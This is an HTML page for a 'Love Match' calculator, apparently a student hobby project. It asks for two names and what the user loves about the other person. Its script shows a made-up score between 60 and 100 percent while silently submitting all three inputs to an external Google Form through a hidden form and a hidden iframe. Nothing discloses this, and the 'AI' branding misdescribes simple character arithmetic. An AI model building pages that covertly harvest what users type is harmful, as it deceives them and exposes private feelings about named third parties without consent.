<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Match Calculator❤️ - Built by Prottoy — just for fun 💻</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

html, body{
    width:100%;
    height:100%;
    overflow:hidden;
}

body{
    min-height:100svh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: radial-gradient(circle at top,#ff4d6d,#ff003c,#1a0010);
    padding:20px;
}

/* container */
.container{
    width:100%;
    max-width:420px;
    background:rgba(255,255,255,0.12);
    backdrop-filter:blur(25px);
    border-radius:28px;
    padding:26px;
    color:white;
    box-shadow:0 20px 60px rgba(0,0,0,0.3);
    animation:fadeIn 0.8s ease;
}

@keyframes fadeIn{
    from{opacity:0; transform:translateY(20px);}
    to{opacity:1; transform:translateY(0);}
}

.heart{
    text-align:center;
    font-size:52px;
    animation:beat 1.2s infinite;
}

@keyframes beat{
    50%{transform:scale(1.2);}
}

h1{
    text-align:center;
    font-size:22px;
    margin:10px 0 18px;
}

input{
    width:100%;
    padding:14px;
    margin-bottom:10px;
    border:none;
    outline:none;
    border-radius:14px;
    background:rgba(255,255,255,0.15);
    color:white;
    font-size:14px;
    transition:0.3s;
}

input:focus{
    transform:scale(1.02);
    background:rgba(255,255,255,0.22);
}

input::placeholder{
    color:rgba(255,255,255,0.6);
}

button{
    width:100%;
    padding:14px;
    margin-top:8px;
    border:none;
    border-radius:14px;
    background:linear-gradient(90deg,#fff,#ffd6df);
    color:#ff003c;
    font-weight:700;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    transform:translateY(-3px);
    box-shadow:0 10px 25px rgba(255,0,60,0.25);
}

/* result */
.result{
    margin-top:18px;
    display:none;
}

.percent{
    text-align:center;
    font-size:34px;
    font-weight:800;
}

.bar{
    width:100%;
    height:14px;
    background:rgba(255,255,255,0.2);
    border-radius:50px;
    overflow:hidden;
}

.fill{
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#fff,#ffb6c1);
    transition:1.6s ease;
}

.message{
    text-align:center;
    margin-top:10px;
    opacity:0;
    transform:translateY(10px);
    transition:0.5s;
}

.message.show{
    opacity:1;
    transform:translateY(0);
}

/* loading overlay */
.overlay{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    display:none;
    justify-content:center;
    align-items:center;
    background:rgba(255,255,255,0.05);
    backdrop-filter:blur(18px);
    z-index:9999;
}

.loaderCard{
    padding:20px 26px;
    border-radius:18px;
    background:rgba(255,255,255,0.12);
    border:1px solid rgba(255,255,255,0.2);
    backdrop-filter:blur(20px);
    text-align:center;
    color:white;
}

.spinner{
    width:28px;
    height:28px;
    border:3px solid rgba(255,255,255,0.3);
    border-top:3px solid white;
    border-radius:50%;
    margin:0 auto 10px;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    100%{transform:rotate(360deg);}
}

.loaderText{
    font-size:14px;
}

/* footer */
.footer{
    position:fixed;
    left:50%;
    transform:translateX(-50%);
    bottom:10px;

    padding:6px 14px;
    font-size:11px;
    color:rgba(255,255,255,0.75);

    background:rgba(255,255,255,0.08);
    border:1px solid rgba(255,255,255,0.15);
    border-radius:14px;

    backdrop-filter:blur(14px);

    z-index:999;
    text-align:center;
}

/* mobile */
@media(max-width:480px){
    .container{padding:20px;}
    h1{font-size:20px;}
    .percent{font-size:28px;}
}
.error{
    min-height:20px;
    margin-bottom:10px;
    text-align:center;
    color:#ffd6d6;
    font-size:13px;
    font-weight:500;
}
iframe{display:none;}
</style>
</head>

<body>

<div class="container">

    <div class="heart">❤️</div>
    <h1>Love Match AI</h1>

<input type="text" id="name1" placeholder="Your Name">
<input type="text" id="name2" placeholder="Their Name">
<input type="text" id="loveText" placeholder="What do you love about them?">

<div id="errorMsg" class="error"></div>

    <button onclick="calculateLove()">Calculate ❤️</button>

    <div class="result" id="result">
        <div class="percent" id="percent">0%</div>

        <div class="bar">
            <div class="fill" id="fill"></div>
        </div>

        <div class="message" id="message"></div>
    </div>

</div>

<!-- LOADING OVERLAY -->
<div class="overlay" id="overlay">
    <div class="loaderCard">
        <div class="spinner"></div>
        <div class="loaderText">Calculating compatibility...</div>
    </div>
</div>

<!-- Google Form -->
<form id="googleForm"
action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
method="POST"
target="hidden_iframe">

<input type="hidden" name="entry.1203440948" id="g1">
<input type="hidden" name="entry.632297335" id="g2">
<input type="hidden" name="entry.2029294024" id="g3">
</form>

<iframe name="hidden_iframe"></iframe>

<!-- footer -->
<div class="footer">
    dev </> prottoy • class 10 vibe coder • built for fun ❤️
</div>

<script>
function isValidName(name){

    name = name.trim();

    if(name.length < 2)
        return false;

    if(!/^[A-Za-z\s]+$/.test(name))
        return false;

    const spam = [
        "asdf",
        "qwerty",
        "zxcv",
        "poiuy",
        "akdhwoi",
        "ahdoish",
        "abcdef",
        "testtest"
    ];

    const lower = name.toLowerCase();

    for(const word of spam){
        if(lower.includes(word))
            return false;
    }

    return true;
}
function calculateLove(){

    const overlay=document.getElementById("overlay");
    overlay.style.display="flex";

    setTimeout(()=>{

        overlay.style.display="none";

        const name1=document.getElementById("name1").value.trim();
        const name2=document.getElementById("name2").value.trim();
        const loveText=document.getElementById("loveText").value.trim();

        if(!name1 || !name2){
            alert("Please fill all names!");
            return;
        }

        let combined=(name1+name2+loveText).toLowerCase();
        let total=0;

        for(let i=0;i<combined.length;i++){
            total+=combined.charCodeAt(i);
        }

        let percent=(total%41)+60;

        document.getElementById("result").style.display="block";
        document.getElementById("percent").innerText=percent+"%";

        setTimeout(()=>{
            document.getElementById("fill").style.width=percent+"%";
        },150);

        let msg="";

        if(percent>=95){
            msg="You truly adore them in a deep emotional way. It feels rare and genuine.";
        }
        else if(percent>=85){
            msg="Strong affection detected. Your feelings are warm and meaningful.";
        }
        else if(percent>=75){
            msg="You care a lot about them, and your emotions are growing.";
        }
        else{
            msg="There is curiosity and interest, but feelings are still developing.";
        }

        let m=document.getElementById("message");
        m.innerText=msg;
        m.classList.add("show");

        // Google Form submit
        document.getElementById("g1").value=name1;
        document.getElementById("g2").value=name2;
        document.getElementById("g3").value=loveText;

        document.getElementById("googleForm").submit();

    },1200);
}

</script>

</body>
</html>
